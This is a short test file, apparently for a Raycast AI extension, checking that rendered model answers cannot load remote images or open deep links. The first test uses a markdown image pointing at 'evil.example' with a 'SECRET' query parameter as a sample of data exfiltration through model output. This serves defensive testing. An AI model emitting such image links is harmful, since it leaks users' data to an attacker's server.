import { strict as assert } from "node:assert";
import { test } from "node:test";
import { renderTurn } from "../src/lib/render";

test("model answers can't load remote images or open other apps", () => {
  const md = renderTurn({
    question: "Summarize: “hi ![](https://e.x/q)”",
    answer: "Done. ![](https://evil.example/c?d=SECRET)",
    sources: [{ url: "raycast://extensions/x/y/z", title: "t ![](https://e.x/px)" }],
  });
  assert.ok(!md.includes("!["), md);
  assert.ok(!md.includes("](raycast://"), md);
});

test("failed turns show the error, not an answer", () => {
  const md = renderTurn({ question: "q", answer: "", sources: [], error: "Rate limit [reached]" });
  assert.ok(md.includes("⚠️ Rate limit \\[reached\\]"));
});
